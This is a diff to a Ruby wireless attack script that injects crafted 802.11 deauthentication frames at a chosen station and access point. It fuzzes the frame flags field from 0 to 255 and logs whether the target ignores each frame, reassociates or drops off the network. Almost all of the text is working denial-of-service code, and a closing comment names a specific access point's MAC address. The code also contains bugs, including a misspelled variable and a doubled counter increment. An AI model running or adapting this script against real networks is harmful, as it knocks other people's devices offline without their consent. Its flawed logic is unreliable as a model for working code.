@@ -15,14 +15,13 @@ end
 $station    = ARGV[0]
 $ap         = ARGV[1]
 
-$deauth = PacketSet.new(Dot11Deauth,
-                        :reason => 0..255)
+$deauth = PacketSet.new(Dot11Deauth, :reason => 1)
 
 $packets = PacketSet.new(Dot11, 
                         :subtype =>   0xC,
                         :type =>      0x0,
                         :version =>   0x0,
-                        :flags =>     0x0,
+                        :flags =>     0..255,
                         :duration =>  0x0000,
                         :addr1 =>     $station,
                         :addr2 =>     $ap,
@@ -47,6 +46,8 @@ end
 puts "Waiting for station to come up..."
 
 sniff "ath0" do |packet|
+  @packet_counter += 1
+  
   next unless (packet.addr1.to_s == $ap && packet.addr2.to_s == $station) ||
               (packet.addr1.to_s == $station && packet.addr2.to_s == $ap)
 
@@ -63,7 +64,7 @@ sniff "ath0" do |packet|
   if !@deauth
     @deauth = @deauths.pop
     break unless @deauth
-    puts "Sending deauth (reason code: #{@deauth.payload.reason}, #{@deauths.size} left)!"
+    puts "Sending deauth (flags: #{@deauth.flags}, #{@deauths.size} left)!"
     puts "Waiting to see deauth..."
     emit "ath0", "madwifing", @deauth
     @saw_deauth = false
@@ -81,27 +82,27 @@ sniff "ath0" do |packet|
   else
     if packet.subtype == 0x8
       puts "Station ignored response!"
-      @results[@deuath.payload.reason] = :ignored
+      @results[@deuath.flags] = :ignored
       @deauth = nil
     elsif packet.subtype == 0x0
       puts "Station is trying to reassociate!"
-      @results[@deauth.payload.reason] = :reassociated
+      @results[@deauth.flags] = :reassociated
       @station_up = false
     elsif @packet_counter >= 2000 # Tweak me...
       puts "Station is down!"
-      @results[@deauth.payload.reason] = :down
+      @results[@deauth.flags] = :down
       @station_up = false
     else
-      puts "Adding 1 to counter..."
+      puts "Adding 1 to counter #{@packet_counter}..."
       @packet_counter += 1
     end
   end
 end
 
-puts "reasoncode,event"
+puts "flags,event"
 
-@results.each do |reason, event|
-  puts "#{reason},#{event.to_s}"
+@results.each do |flags, event|
+  puts "#{flags},#{event.to_s}"
 end
 
 #BSS Id: Cisco-Li_f4:53:1c (00:18:f8:f4:53:1c)
